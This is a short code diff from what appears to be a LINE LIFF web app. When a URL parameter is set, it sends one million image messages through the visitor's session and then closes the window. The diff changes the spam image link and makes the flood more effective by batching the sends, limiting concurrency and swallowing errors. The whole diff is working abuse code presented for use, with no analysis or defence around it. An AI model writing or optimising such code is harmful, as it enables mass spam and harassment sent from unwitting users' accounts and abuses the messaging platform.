@@ -45,8 +45,8 @@ async function urlParamsCheck() {
     if (spamParam !== null) {
         await sendSpamMessages(1000000, {
             type: 'image',
-            originalContentUrl: "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg",
-            previewImageUrl: "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg"
+            originalContentUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp",
+            previewImageUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp"
         });
         liff.closeWindow();
     }
@@ -61,10 +61,26 @@ async function sendMessage(message) {
     }
 }
 
-async function sendSpamMessages(count, message) {
-    const promises = [];
-    for (let i = 0; i < count; i++) {
-        promises.push(sendMessage(message));
+async function sendSpamMessages(count, message, batchSize = 100, concurrentLimit = 10) {
+    const sendBatch = async (batch) => {
+        const batchPromises = batch.map(async () => {
+            try {
+                await sendMessage(message);
+            } catch (error) {
+                console.error('Batch send error:', error);
+            }
+        });
+        await Promise.all(batchPromises);
+    };
+
+    const batches = [];
+    for (let i = 0; i < count; i += batchSize) {
+        const batchCount = Math.min(batchSize, count - i);
+        batches.push(Array(batchCount).fill(null));
     }
-    await Promise.all(promises);
+
+    for (let i = 0; i < batches.length; i += concurrentLimit) {
+        const concurrentBatches = batches.slice(i, i + concurrentLimit);
+        await Promise.all(concurrentBatches.map(sendBatch));
+    }
 }
